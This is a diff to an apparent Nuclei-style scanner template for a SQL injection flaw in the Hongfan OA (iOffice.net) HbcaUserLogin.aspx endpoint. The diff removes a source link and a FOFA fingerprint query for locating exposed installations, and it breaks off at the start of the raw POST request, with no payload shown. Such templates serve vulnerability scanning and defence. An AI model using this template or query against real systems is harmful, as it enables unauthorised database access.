@@ -3,12 +3,8 @@ info:
   name: 红帆OA HbcaUserLogin 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ssm7gs9oda2fhdme'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ssm7gs9oda2fhdme
-    fofa: title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved"
 http:
 - raw:
   - 'POST /ioffice/Identity/HbcaUserLogin.aspx HTTP/1.1
